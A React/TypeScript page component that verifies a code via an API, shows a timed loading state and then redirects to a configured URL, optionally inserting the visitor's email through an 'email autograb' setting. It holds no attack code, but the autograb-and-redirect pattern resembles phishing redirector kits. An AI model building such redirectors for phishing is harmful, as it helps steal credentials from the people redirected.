import { useEffect, useState } from "react";
import { useRoute } from "wouter";
import { useQuery } from "@tanstack/react-query";
import VerificationProcess from "@/components/VerificationProcess";
import { Settings } from "@/lib/types";

export default function Verification() {
  const [, params] = useRoute("/verify/:code");
  const verificationCode = params?.code;
  const [verificationState, setVerificationState] = useState<'loading' | 'success' | 'error'>('loading');
  const [errorMessage, setErrorMessage] = useState<string>("");
  const [settings, setSettings] = useState<Settings | null>(null);
  
  const { data, isLoading, error } = useQuery({
    queryKey: [`/api/verification/verify/${verificationCode}`],
    enabled: !!verificationCode,
    staleTime: 0,
  });
  
  useEffect(() => {
    if (isLoading) {
      setVerificationState('loading');
    } else if (error) {
      setVerificationState('error');
      const errMessage = error instanceof Error ? error.message : "Verification failed";
      setErrorMessage(errMessage);
    } else if (data) {
      setVerificationState('success');
      setSettings(data.settings);
      
      // Handle redirect after successful verification
      if (data.settings && data.settings.redirectUrl) {
        const redirectTimeout = data.settings.showLoadingSpinner 
          ? (data.settings.loadingDuration * 1000) 
          : 1000;
        
        setTimeout(() => {
          let redirectUrl = data.settings.redirectUrl;
          
          // Handle email autograb feature
          if (data.settings.useEmailAutograb && data.email) {
            const paramName = data.settings.emailAutograbParam || 'email';
            const placeholder = `{${paramName}}`;
            redirectUrl = redirectUrl.replace(placeholder, encodeURIComponent(data.email));
          }
          
          window.location.href = redirectUrl;
        }, redirectTimeout);
      }
    }
  }, [data, isLoading, error]);
  
  return (
    <VerificationProcess 
      state={verificationState} 
      errorMessage={errorMessage}
      settings={settings}
    />
  );
}
